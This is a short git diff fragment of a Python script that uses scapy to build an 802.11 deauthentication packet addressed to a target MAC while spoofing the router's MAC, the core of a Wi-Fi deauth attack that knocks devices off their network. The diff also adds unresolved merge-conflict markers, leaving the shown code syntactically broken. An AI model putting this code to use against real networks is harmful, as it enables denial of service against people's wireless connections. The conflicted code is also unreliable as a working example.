@@ -29,8 +29,13 @@ if options.mode:
 else:
 
     ## crafting the packet
+<<<<<<< HEAD
+    
+    dot_layer = scapy.Dot11(addr1 = options.target_mac, addr2 = options.router_mac, addr3 = options.router_mac)
+=======
     print(options.target_mac, options.router_mac)
     dot_layer = scapy.Dot11(type=8, subtype=12, addr1 = options.target_mac, addr2 = options.router_mac, addr3 = options.router_mac)
+>>>>>>> 7c49fc9595b5f5bc0ee11b636d60a504d106f46a
     packet = scapy.RadioTap() / dot_layer / scapy.Dot11Deauth()
 
     ## sending the packet
